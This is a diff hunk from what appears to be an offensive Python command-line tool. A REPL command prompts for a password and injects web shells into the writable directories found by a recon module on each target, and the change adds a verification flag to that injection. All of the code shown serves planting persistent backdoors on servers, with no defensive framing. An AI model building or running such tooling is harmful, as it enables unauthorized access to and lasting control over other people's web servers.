@@ -426,7 +426,8 @@ class Repl(cmd2.Cmd):
         password = input("New password (blank = random per directory): ").strip() or None
         self._each(
             lambda ws: inject.inject_webshell(
-                ws, password, recon.find_writable_dirs(ws), output_dir=self.config.output_dir
+                ws, password, recon.find_writable_dirs(ws),
+                output_dir=self.config.output_dir, verify=True,
             ),
             "inject",
         )
